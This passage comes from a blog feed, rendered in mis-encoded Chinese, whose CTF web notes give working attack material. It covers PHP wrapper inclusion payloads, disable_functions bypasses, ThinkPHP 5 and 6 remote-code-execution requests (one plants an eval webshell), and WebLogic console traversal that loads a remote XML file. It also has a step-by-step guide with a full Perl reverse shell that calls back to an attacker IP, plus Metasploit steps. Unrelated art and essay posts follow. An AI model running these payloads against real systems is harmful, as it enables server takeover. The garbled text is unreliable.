æ³•æˆåŠŸ,allow_url_fopenæ˜¯å¦å¼€å¯æ— å…³ç´§è¦ã€‚php:&#x2F;&#x2F;inputæ˜¯ç”¨æ¥æ¥æ”¶postæ•°æ®çš„å½“enctype&#x3D;â€multipart&#x2F;form-dataâ€çš„æ—¶å€™php:&#x2F;&#x2F;inputæ˜¯æ— æ•ˆphp:&#x2F;&#x2F;input ç”¨äº application&#x2F;x-www-form-urlencoded æˆ– text&#x2F;plain ç¼–ç ç±»å‹çš„è¡¨å•æ•°æ®ã€‚<ul><li>ä¾‹å­ï¼šæ–‡ä»¶åŒ…å«</li></ul></li><li>data:&#x2F;&#x2F;       allow_url_includeä¸allow_url_fopené€‰é¡¹å¿…é¡»è®¾ç½®ä¸ºon<ul><li>ç”¨æ³•ï¼š<ul><li>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?></li><li>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li><li>æˆ–è€…ï¼š</li><li>data:text&#x2F;plain,<?php phpinfo()?></li><li>data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li></ul></li></ul></li></ul><h2 id="disable-functionsæ˜¯php-iniä¸­çš„ä¸€ä¸ªè®¾ç½®é€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®PHPç¯å¢ƒç¦æ­¢ä½¿ç”¨æŸäº›å‡½æ•°"><a href="#disable-functionsæ˜¯php-iniä¸­çš„ä¸€ä¸ªè®¾ç½®é€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®PHPç¯å¢ƒç¦æ­¢ä½¿ç”¨æŸäº›å‡½æ•°" class="headerlink" title="disable_functionsæ˜¯php.iniä¸­çš„ä¸€ä¸ªè®¾ç½®é€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®PHPç¯å¢ƒç¦æ­¢ä½¿ç”¨æŸäº›å‡½æ•°"></a>disable_functionsæ˜¯php.iniä¸­çš„ä¸€ä¸ªè®¾ç½®é€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®PHPç¯å¢ƒç¦æ­¢ä½¿ç”¨æŸäº›å‡½æ•°</h2><ul><li>ä¸ºäº†å®‰å…¨,è¿ç»´äººå‘˜ä¼šç¦ç”¨PHPçš„ä¸€äº›â€œå±é™©â€å‡½æ•°,å°†å…¶å†™åœ¨php.inié…ç½®æ–‡ä»¶ä¸­,å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„disable_functionsäº†ã€‚</li><li>disable_functionsæ˜¯ä¸€ä¸ªé»‘åå•æœºåˆ¶ï¼Œå¦‚æœåœ¨æ¸—é€æ—¶å·²ç»ä¸Šä¼ äº†webshellå´å› ä¸ºdisable_functionså¯¼è‡´æˆ‘ä»¬æ— æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™æ—¶å€™å°±éœ€è¦å»è¿›è¡Œä¸€ä¸ªç»•è¿‡ã€‚</li></ul><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><ul><li>PoC<ul><li>ç¦ç”¨äº†å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°å¦‚systemã€execã€passthruä½†ä¸èƒ½ç¦ç”¨æ‰€æœ‰å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœç¦ç”¨äº†stream_filter_registeræˆ–ç±»ä¼¼å‡½æ•°ï¼Œè¿™ä¸ªPoCå¯èƒ½æ— æ³•æ‰§è¡Œï¼‰ã€‚</li><li>PoCä¸»è¦é’ˆå¯¹Unix-likeç³»ç»Ÿï¼ˆLinuxã€macOSç­‰ï¼‰ï¼Œå› ä¸ºå®ƒä¾èµ–äºåº•å±‚çš„å†…å­˜ç®¡ç†ç‰¹æ€§ï¼Œè¿™åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´å¯èƒ½æœ‰æ‰€ä¸åŒã€‚</li><li>æ²¡æœ‰å¯ç”¨è¯¸å¦‚open_basedirç­‰é™åˆ¶æ€§é…ç½®</li><li>æ²¡æœ‰å¯ç”¨safe_modeï¼ˆè™½ç„¶safe_modeåœ¨PHP 5.4ä¸­è¢«ç§»é™¤ï¼Œä½†åœ¨æŸäº›ç¯å¢ƒä¸­ä»å¯èƒ½ä¼šå½±å“æ¼æ´åˆ©ç”¨ï¼‰ã€‚</li><li>æœåŠ¡å™¨é…ç½®å…è®¸ä½¿ç”¨php:&#x2F;&#x2F;memoryç­‰æµåŒ…è£…å™¨ã€‚</li><li>ä¸Šä¼ PoC.phpæœ€åè®¿é—®PoC.phpè·å–flag</li></ul></li></ul><h3 id="åˆ©ç”¨-LD-PRELOADçªç ´"><a href="#åˆ©ç”¨-LD-PRELOADçªç ´" class="headerlink" title="åˆ©ç”¨[LD_PRELOADçªç ´"></a>åˆ©ç”¨[LD_PRELOADçªç ´</h3><ul><li>æ‰¾åˆ°â€œç»•è¿‡disable_funtionsâ€œï¼Œåœ¨åˆšåˆšè¿æ¥ä¸Šçš„shellå³é”®-&gt;åŠ è½½æ’ä»¶-&gt;è¾…åŠ©å·¥å…·-&gt;ç»•è¿‡disable_functionsã€‚æ¨¡å¼é€‰æ‹©<code>PHP7_GC_UAF</code>å†ç‚¹å‡»å¼€å§‹ï¼Œå°±èƒ½æ‰§è¡Œå‘½ä»¤äº†</li></ul><h3 id="åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡"><a href="#åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡" class="headerlink" title="åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡"></a>åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡</h3><ul><li>æŸ¥çœ‹com.allow_dcomæ˜¯å¦å¼€å¯,è¿™ä¸ªé»˜è®¤æ˜¯ä¸å¼€å¯çš„ã€‚</li><li>ä¸Šä¼  EXP è„šæœ¬</li><li><a href="http://target.com/uploads/com.php%EF%BC%9Fcmd=whoami">http://target.com/uploads/com.phpï¼Ÿcmd=whoami</a></li></ul><h3 id="åˆ©ç”¨PHP7-4-FFIç»•è¿‡"><a href="#åˆ©ç”¨PHP7-4-FFIç»•è¿‡" class="headerlink" title="åˆ©ç”¨PHP7.4 FFIç»•è¿‡"></a>åˆ©ç”¨PHP7.4 FFIç»•è¿‡</h3><h3 id="ThinkPHP-5-çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰"><a href="#ThinkPHP-5-çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰" class="headerlink" title="ThinkPHP 5 çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰"></a>ThinkPHP 5 çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</h3><ul><li>POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</li><li>Host: IP:PORT</li><li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li><li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li><li>Accept-Encoding: gzip, deflate</li><li>Connection: close</li><li>Upgrade-Insecure-Requests: 1</li><li>Pragma: no-cache</li><li>Cache-Control: no-cache</li><li>Content-Type: application&#x2F;x-www-form-urlencoded</li><li>Content-Length: 79<ul><li>_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</li></ul></li></ul><h3 id="tp6rce"><a href="#tp6rce" class="headerlink" title="tp6rce"></a>tp6rce</h3><ul><li>@Session::set(â€˜userâ€™,$_GET[â€˜usernameâ€™]);</li><li>è®¿é—®ä¼šçœ‹åˆ°sessionè®¾ç½®ï¼Œæ„é€ æ•°æ®åŒ…å¦‚ä¸‹</li><li>GET &#x2F;public&#x2F;index.php?username&#x3D;<?php+eval($_GET[1]);?> HTTP&#x2F;1.1</li><li>Host: IP:PORT</li><li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li><li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li><li>Accept-Encoding: gzip, deflate</li><li>Connection: close</li><li>Cookie: PHPSESSID&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;public&#x2F;111111112.php</li><li>Upgrade-Insecure-Requests: 1</li><li>æ¥ç€è®¿é—®<code>http://IP:PORT/public/111111112.php?1=system(%22cat%20/flag%22);</code></li></ul><h3 id="WebLogic-æœåŠ¡å™¨çš„æ¼æ´åˆ©ç”¨"><a href="#WebLogic-æœåŠ¡å™¨çš„æ¼æ´åˆ©ç”¨" class="headerlink" title="WebLogic æœåŠ¡å™¨çš„æ¼æ´åˆ©ç”¨"></a>WebLogic æœåŠ¡å™¨çš„æ¼æ´åˆ©ç”¨</h3><ul><li>WebLogicæ§åˆ¶å°å¿…é¡»å¯¹å¤–æš´éœ²ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ <a href="http://IP:PORT/console">http://IP:PORT/console</a> è®¿é—®</li><li>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3WebLogicæœåŠ¡å™¨ä½¿ç”¨äº†å—å½±å“çš„Spring Frameworkç»„ä»¶ï¼Œè¯¥ç»„ä»¶çš„ FileSystemXmlApplicationContext å…è®¸é€šè¿‡URLåŠ è½½è¿œç¨‹çš„XMLé…ç½®æ–‡ä»¶ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨æœªä½¿ç”¨æˆ–å·²ä¿®å¤ç›¸å…³æ¼æ´ï¼Œè¯¥æ”»å‡»å°†å¤±æ•ˆã€‚æ”»å‡»è€…èƒ½æ§åˆ¶è¿œç¨‹æ–‡ä»¶</li><li>è®¿é—®<code>http://IP:PORT/console</code>åˆ°ç™»å½•é¡µé¢</li><li>æ¥ç€è®¿é—®<code>http://IP:PORT/console/css/%252e%252e%252fconsole.portal</code>ï¼ˆè¿™é‡Œæœ€å¥½æŠ“åŒ…ä¿®æ”¹ï¼‰</li><li>æ¥ç€åœ¨æœ¬åœ°ç”¨pythonèµ·ä¸€ä¸ªHTTPæœåŠ¡ï¼ŒHTTPä¸‹æ”¾ç½®weblogic.xml</li><li><pre><code class="python">python3 -m http.server 8001        æ¥ç€è®¿é—®`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8001/weblogic.xml&quot;)`      çŸ­rceï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ          å½¢å¦‚`$&#123;_GET&#125;&#123;%f8&#125;();&amp;%f8=cmd`çš„payloadéœ€è¦çš„ä»£ç é‡æœ€å°‘ä¸”åŠŸèƒ½é½å…¨ï¼Œ</code></pre></li></ul><p>ä½¿ç”¨Metasploit Frameworkæ¥æ£€æµ‹å’Œåˆ©ç”¨CGIæ¼æ´çš„è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ã€‚æˆ‘ä»¬å°†è¯¦ç»†è§£é‡Šå¦‚ä½•å®Œæˆæ¯ä¸€æ­¥ï¼ŒåŒ…æ‹¬å¦‚ä½•ç¡®ä¿ç¯å¢ƒå‡†å¤‡å¥½ã€å¦‚ä½•åˆ›å»ºå’Œæ‰§è¡Œè„šæœ¬ã€‚</p><h3 id="1-ç¯å¢ƒæ£€æŸ¥"><a href="#1-ç¯å¢ƒæ£€æŸ¥" class="headerlink" title="1. ç¯å¢ƒæ£€æŸ¥"></a>1. ç¯å¢ƒæ£€æŸ¥</h3><p>åœ¨å°è¯•åˆ©ç”¨CGIæ¼æ´ä¹‹å‰ï¼Œä½ éœ€è¦ç¡®ä¿ç›®æ ‡æœåŠ¡å™¨ç¬¦åˆä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li><strong>æœåŠ¡å™¨å…è®¸æ‰§è¡ŒCGIè„šæœ¬</strong>ï¼šCGIè„šæœ¬é€šå¸¸æ”¾åœ¨æœåŠ¡å™¨çš„<code>/cgi-bin/</code>ç›®å½•ä¸‹ï¼Œä½ éœ€è¦ç¡®ä¿ç›®æ ‡æœåŠ¡å™¨å…è®¸æ‰§è¡Œè¯¥ç›®å½•ä¸‹çš„è„šæœ¬ã€‚</li><li><strong>å½“å‰ç›®å½•å¯å†™</strong>ï¼šä½ éœ€è¦åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰å†™æƒé™ï¼Œä»¥ä¾¿ä¸Šä¼ æˆ–åˆ›å»ºæ¶æ„CGIè„šæœ¬ã€‚</li><li><strong>.htaccessæ–‡ä»¶æœ‰æ•ˆ</strong>ï¼š<code>.htaccess</code>æ–‡ä»¶ç”¨äºæ§åˆ¶ApacheæœåŠ¡å™¨çš„é…ç½®ï¼Œç¡®ä¿è¯¥æ–‡ä»¶å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ­£å¸¸ä½¿ç”¨ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥ç”¨æ¥è¦†ç›–æœåŠ¡å™¨é»˜è®¤é…ç½®ï¼Œä¾‹å¦‚ï¼Œå…è®¸æ‰§è¡ŒæŸä¸ªç›®å½•ä¸­çš„CGIè„šæœ¬ã€‚</li></ul><h3 id="2-åˆ›å»ºæ¶æ„CGIè„šæœ¬"><a href="#2-åˆ›å»ºæ¶æ„CGIè„šæœ¬" class="headerlink" title="2. åˆ›å»ºæ¶æ„CGIè„šæœ¬"></a>2. åˆ›å»ºæ¶æ„CGIè„šæœ¬</h3><p>æ¥ä¸‹æ¥ï¼Œä½ éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„CGIè„šæœ¬ï¼Œè¯¥è„šæœ¬ä¼šè¿æ¥åˆ°æ”»å‡»è€…çš„æœºå™¨ï¼Œå¹¶æä¾›ä¸€ä¸ªåå‘Shellï¼ˆreverse shellï¼‰ã€‚è¿™æ˜¯åˆ©ç”¨CGIæ¼æ´çš„å…³é”®æ­¥éª¤ã€‚</p><p>å‡è®¾ä½ ä½¿ç”¨Perlç¼–å†™è¿™ä¸ªæ¶æ„CGIè„šæœ¬ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;æ”»å‡»è€…çš„IP&quot;</span>;  <span class="hljs-comment"># æ”»å‡»è€…çš„IPåœ°å€</span><br><span class="hljs-variable">$port</span> = æ”»å‡»è€…ç›‘å¬çš„ç«¯å£;  <span class="hljs-comment"># æ”»å‡»è€…ç›‘å¬çš„ç«¯å£å·</span><br><span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&quot;tcp&quot;</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in(<span class="hljs-variable">$port</span>,inet_aton(<span class="hljs-variable">$ip</span>))))&#123;<br>  <span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>); <span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>); <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<br>  <span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†æ”»å‡»è€…çš„IPåœ°å€å’Œç«¯å£å·æ›¿æ¢ä¸ºä½ å®é™…çš„IPåœ°å€å’Œç«¯å£å·ï¼Œç„¶åå°†è¿™ä¸ªè„šæœ¬ä¿å­˜ä¸º<code>malicious.cgi</code>ã€‚</p><h3 id="3-ä¸Šä¼ è„šæœ¬å¹¶ä¿®æ”¹-htaccess"><a href="#3-ä¸Šä¼ è„šæœ¬å¹¶ä¿®æ”¹-htaccess" class="headerlink" title="3. ä¸Šä¼ è„šæœ¬å¹¶ä¿®æ”¹.htaccess"></a>3. ä¸Šä¼ è„šæœ¬å¹¶ä¿®æ”¹.htaccess</h3><p>ä¸Šä¼ ä½ çš„<code>malicious.cgi</code>åˆ°ç›®æ ‡æœåŠ¡å™¨çš„CGIç›®å½•ä¸­ï¼Œæ¯”å¦‚<code>/cgi-bin/</code>ã€‚å¦‚æœä½ æ²¡æœ‰ç›´æ¥ä¸Šä¼ çš„æƒé™ï¼Œå¯ä»¥å°è¯•é€šè¿‡å…¶ä»–æ¼æ´ä¸Šä¼ ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œåˆ›å»ºæˆ–ä¿®æ”¹<code>.htaccess</code>æ–‡ä»¶ï¼Œä½¿å¾—<code>malicious.cgi</code>å¯ä»¥æ‰§è¡Œï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Options</span> +ExecCGI<br><span class="hljs-attribute">AddHandler</span> cgi-script .cgi<br></code></pre></td></tr></table></figure><p>ç¡®ä¿è¿™ä¸ª<code>.htaccess</code>æ–‡ä»¶ä¸<code>malicious.cgi</code>ä½äºåŒä¸€ç›®å½•ä¸‹ã€‚</p><h3 id="4-æ‰§è¡Œè„šæœ¬"><a href="#4-æ‰§è¡Œè„šæœ¬" class="headerlink" title="4. æ‰§è¡Œè„šæœ¬"></a>4. æ‰§è¡Œè„šæœ¬</h3><p>é€šè¿‡Webæµè§ˆå™¨è®¿é—®ä¸Šä¼ çš„<code>malicious.cgi</code>è„šæœ¬ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>target-server.com<span class="hljs-regexp">/cgi-bin/m</span>alicious.cgi<br></code></pre></td></tr></table></figure><p>ä¸€æ—¦è®¿é—®æˆåŠŸï¼Œæ¶æ„CGIè„šæœ¬ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œå¹¶ä¸”é€šè¿‡æŒ‡å®šçš„IPå’Œç«¯å£ä¸æ”»å‡»è€…çš„æœºå™¨å»ºç«‹åå‘è¿æ¥ã€‚æ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ªè¿æ¥è·å¾—ç›®æ ‡æœåŠ¡å™¨çš„Shellè®¿é—®æƒé™ã€‚</p><h3 id="5-ä½¿ç”¨Metasploit"><a href="#5-ä½¿ç”¨Metasploit" class="headerlink" title="5. ä½¿ç”¨Metasploit"></a>5. ä½¿ç”¨Metasploit</h3><p>Metasploitä¹Ÿæä¾›äº†å¤šç§æ¨¡å—æ¥æ£€æµ‹å’Œåˆ©ç”¨CGIæ¼æ´ã€‚å¸¸è§çš„æ­¥éª¤åŒ…æ‹¬ï¼š</p><ul><li><p><strong>å¯åŠ¨Metasploit Console</strong>ï¼šåœ¨ç»ˆç«¯ä¸­è¿è¡Œ<code>msfconsole</code>å¯åŠ¨Metasploitã€‚</p></li><li><p><strong>é€‰æ‹©åˆé€‚çš„æ¨¡å—</strong>ï¼šä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨<code>use exploit/unix/webapp/web_delivery</code>æ¨¡å—ï¼Œç»“åˆç‰¹å®šçš„Payloadæ¥ç”Ÿæˆå¹¶åˆ©ç”¨æ¶æ„CGIè„šæœ¬ã€‚</p></li><li><p><strong>é…ç½®æ¨¡å—é€‰é¡¹</strong>ï¼šè®¾ç½®ç›®æ ‡URLã€Payloadç±»å‹ï¼ˆå¦‚Perlã€Pythonç­‰ï¼‰ï¼Œä»¥åŠæ”»å‡»è€…çš„IPå’Œç«¯å£ã€‚</p></li><li><p><strong>è¿è¡Œæ”»å‡»</strong>ï¼šæ‰§è¡Œ<code>exploit</code>å‘½ä»¤ï¼ŒMetasploitä¼šè‡ªåŠ¨å‘é€æ¶æ„è¯·æ±‚ï¼Œå°è¯•åˆ©ç”¨CGIæ¼æ´ã€‚</p></li></ul><h3 id="6-å»ºç«‹è¿æ¥å’Œåç»­æ“ä½œ"><a href="#6-å»ºç«‹è¿æ¥å’Œåç»­æ“ä½œ" class="headerlink" title="6. å»ºç«‹è¿æ¥å’Œåç»­æ“ä½œ"></a>6. å»ºç«‹è¿æ¥å’Œåç»­æ“ä½œ</h3><p>å¦‚æœæˆåŠŸï¼ŒMetasploitä¼šç»™ä½ ä¸€ä¸ªäº¤äº’å¼çš„Shellï¼Œæ¥ä¸‹æ¥ä½ å¯ä»¥ç»§ç»­é€šè¿‡è¿™ä¸ªShellæ‰§è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ï¼Œä¾‹å¦‚ææƒã€æ¨ªå‘ç§»åŠ¨ç­‰ã€‚</p><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li><strong>æ³•å¾‹å’Œé“å¾·</strong>ï¼šè¯·ç¡®ä¿åœ¨åˆæ³•å’Œé“å¾·èŒƒå›´å†…æ“ä½œã€‚æœªç»æˆæƒçš„å…¥ä¾µæˆ–æ”»å‡»æ˜¯éæ³•çš„ã€‚</li><li><strong>ç¯å¢ƒçš„å¤šæ ·æ€§</strong>ï¼šä¸åŒçš„æœåŠ¡å™¨ç¯å¢ƒé…ç½®å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œç¡®ä¿ä½ äº†è§£ç›®æ ‡æœåŠ¡å™¨çš„å…·ä½“é…ç½®ã€‚</li></ul><p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ å¯ä»¥åˆ©ç”¨Metasploit Frameworkå’ŒCGIæ¼æ´è·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æ§åˆ¶æƒã€‚ç„¶è€Œï¼Œåœ¨å®é™…æ“ä½œä¸­ï¼ŒåŠ¡å¿…è¦å°å¿ƒå¹¶ç¡®ä¿éµå®ˆç›¸å…³æ³•å¾‹æ³•è§„ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è‰ºæœ¯</title>
    <link href="/2024/08/31/%E8%89%BA%E6%9C%AF/"/>
    <url>/2024/08/31/%E8%89%BA%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/d3f796e9470a7a815944cbb4190e96d.jpg"></p><p><img src="/../img/995c89fe9d2e20baee99d09a75088d5.jpg"></p><p><img src="/../img/e297518df4ce056d19e0be589fe967d.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>è‰ºæœ¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è‡ªå·±çš„è‰ºæœ¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„é©å‘½</title>
    <link href="/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/"/>
    <url>/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="ã€Œè™›æ— ã€"><a href="#ã€Œè™›æ— ã€" class="headerlink" title="ã€Œè™›æ— ã€"></a>ã€Œè™›æ— ã€</h2><img src="F:\new myblog\STUDY\source\img\112dea9d2797ae224a01a3fe02821bc.jpg" style="zoom: 50%;" /><p>æˆ–ä¸ä¹‹å¯¹æŠ—ã€æˆ–å¬å¤©ç”±å‘½ï¼Œäººä»¬æ€»ä¼šæ‰¾åˆ°ç­”æ¡ˆ</p><p>ã€Œäººä»¬æ²‰ç¡ï¼Œæ˜¯ä¸ºäº†æœ€ç»ˆä»æ¢¦ä¸­é†’æ¥ã€ä¸€ä¸€è¿™å°±æ˜¯ä¸€ä½å‚å‚è€çŸ£çš„æ— åå®¢ç©·å°½ä¸€ç”Ÿå¾—å‡ºçš„è§£ç­”ã€‚</p><p>æ¯ä¸ªäººéƒ½ä¼šæœ‰è¿·è·¯çš„æ—¶å€™ï¼ŒçŠ¹è±«ä¸å†³ï¼Œä¸çŸ¥é“è¯¥å»å¾€å“ªä¸ªæ–¹å‘ã€‚å®ƒå­˜åœ¨äºè¿™ç‰‡æ¢¦å¢ƒä¸­ï¼Œä¹Ÿå­˜åœ¨äºæ¢¦å¢ƒä¹‹å¤–çš„ä»»ä½•åœ°æ–¹ã€‚èµ°å‘å±äºè‡ªå·±çš„å‰æ–¹ï¼Œæ‰¾åˆ°ç‹¬å±äºèº«å·±çš„æ„ä¹‰ï¼Œå¹¶åœ¨ç”Ÿå‘½çš„æœ€åä½“é¢çš„è¿æ¥è™šæ— çš„é™ä¸´</p><p>æˆ‘ä»¬æœ‰è¡ŒåŠ¨çš„æƒåˆ©ï¼Œæˆ‘ä»¬æœ‰å®šä¹‰è‡ªå·±ç»“å±€çš„æƒåˆ©ï¼Œæˆ‘ä»¬æœ‰å‰è¿›çš„æƒåˆ©ï¼Œèµ°åœ¨ç»“å±€çš„è·¯ä¸Šï¼Œäººèƒ½åšçš„äº‹æœ‰å¾ˆå¤šï¼Œè€Œç»“å±€ä¹Ÿä¼šå› æ­¤å±•ç°æˆªç„¶ä¸åŒçš„æ„ä¹‰</p><p>æ°¸è¿œå¹¸ç¦çš„æ¢¦å¢ƒä¼šä»¥ä½•ç§æ–¹å¼å®ç°ï¼š</p><p>æœ‰äººæ¸´æœ›é’±è´¢ï¼Œä¾¿æ‹¿èµ°ä»–çš„æ¬²æœ›ï¼Œæœ‰äººçŠ¯ç½ªï¼Œä¾¿æ‹¿èµ°ä»–çš„åå¿µå¤´ï¼Œæœ‰äººç—…ç—›ç¼ 